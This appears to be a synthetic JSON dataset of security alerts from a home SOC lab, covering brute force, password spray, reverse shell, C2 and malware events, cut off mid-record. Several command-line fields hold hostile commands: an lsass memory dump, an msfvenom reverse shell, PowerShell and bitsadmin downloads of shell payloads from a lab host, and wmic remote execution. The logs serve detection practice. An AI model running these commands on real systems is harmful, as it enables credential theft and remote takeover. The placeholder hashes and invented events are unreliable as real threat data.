  {
    "TimeGenerated": "2026-04-21T22:54:37.663256",
    "EventType": "Sysmon Process Create",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T02:59:37.662387",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "admin",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T17:46:37.660849",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "temp.analyst",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "10.0.2.15",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T16:51:37.665202",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-22T14:47:37.662516",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T00:55:37.664218",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-23T04:55:37.665482",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T15:38:37.668714",
    "EventType": "IDS Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T04:52:37.661632",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-24T07:15:37.664043",
    "EventType": "Sysmon Registry Set",
    "Severity": "High",
    "EventCode": 13,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1547.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wmic.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T00:12:37.660072",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "10.0.2.15",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T02:11:37.664629",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "finance.user",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell.exe -enc SQBFAFgA",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T00:41:37.662944",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "jane.smith",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T23:40:37.668976",
    "EventType": "IDS Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": "194.165.16.11",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T16:18:37.665695",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T00:00:37.660264",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T10:24:37.669426",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T21:54:37.661455",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T19:05:37.661490",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T14:23:37.665010",
    "EventType": "LOLBIN Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1218",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe",
    "ProcessName": "msiexec.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T23:32:37.664232",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "john.doe",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/shell.ps1')",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-20T21:27:37.662776",
    "EventType": "Kerberos TGS Request",
    "Severity": "High",
    "EventCode": 4769,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1558.003",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T14:47:37.667337",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Mimikatz",
    "FileHash": "a1b2c3d4e5f6789012345678abcdef01",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T18:44:37.662216",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-21T04:38:37.668628",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "103.45.78.21",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T19:32:37.667372",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Mimikatz",
    "FileHash": "0123456789abcdef0123456789abcdef",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T18:13:37.661369",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T13:26:37.660676",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "jane.smith",
    "Computer": "KALI-LAB-01",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T16:42:37.668877",
    "EventType": "IDS Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "172.16.0.100",
    "DestinationIP": "45.67.22.10",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T01:37:37.669471",
    "EventType": "Wazuh Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T12:20:37.659735",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "ELK-SERVER-01",
    "SourceIP": "192.168.56.103",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T22:46:37.666336",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "103.45.78.21",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T19:33:37.664585",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "praharsh.admin",
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell.exe -ep bypass -file C:\\shell.ps1",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T20:44:37.661396",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-24T10:05:37.661590",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-19T19:18:37.662164",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "finance.user",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-20T00:44:37.662912",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T10:55:37.660694",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "temp.analyst",
    "Computer": "DEV-SERVER-01",
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T02:18:37.669113",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T00:53:37.669201",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T10:12:37.663918",
    "EventType": "Sysmon File Create",
    "Severity": "Medium",
    "EventCode": 11,
    "UserAccount": "finance.user",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1105",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "mshta.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T17:43:37.661478",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T13:55:37.667523",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Ryuk.Ransomware",
    "FileHash": "e10adc3949ba59abbe56e057f20f883e",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T09:08:37.659972",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "185.220.101.45",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T07:50:37.669547",
    "EventType": "Wazuh Alert",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T05:52:37.660206",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "svc.backup",
    "Computer": "FIN-SERVER-01",
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T03:37:37.663633",
    "EventType": "Sysmon Network Connection",
    "Severity": "Medium",
    "EventCode": 3,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wscript.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T17:45:37.662655",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "ubuntu",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-19T19:03:37.662850",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T10:22:37.666487",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T22:39:37.668246",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "45.67.22.10",
    "DestinationIP": "192.168.56.101",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T02:53:37.662263",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-23T04:13:37.664602",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "praharsh.admin",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -nop -w hidden -c IEX",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T10:14:37.660062",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "45.67.22.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T02:37:37.664277",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-21T10:11:37.664803",
    "EventType": "LOLBIN Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1218",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe",
    "ProcessName": "mshta.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T22:25:37.664563",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "svc.backup",
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -nop -w hidden -c IEX",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T00:27:37.664017",
    "EventType": "Sysmon Registry Set",
    "Severity": "High",
    "EventCode": 13,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1547.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "mshta.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T15:38:37.669480",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T08:05:37.666018",
    "EventType": "WMI Remote Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "svc.splunk",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1047",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": "wmic /node:TARGET process call create cmd.exe",
    "ProcessName": "wmiprvse.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T18:00:37.663774",
    "EventType": "Sysmon Image Load",
    "Severity": "High",
    "EventCode": 7,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "bitsadmin.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T21:41:37.665980",
    "EventType": "WMI Remote Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "attacker",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
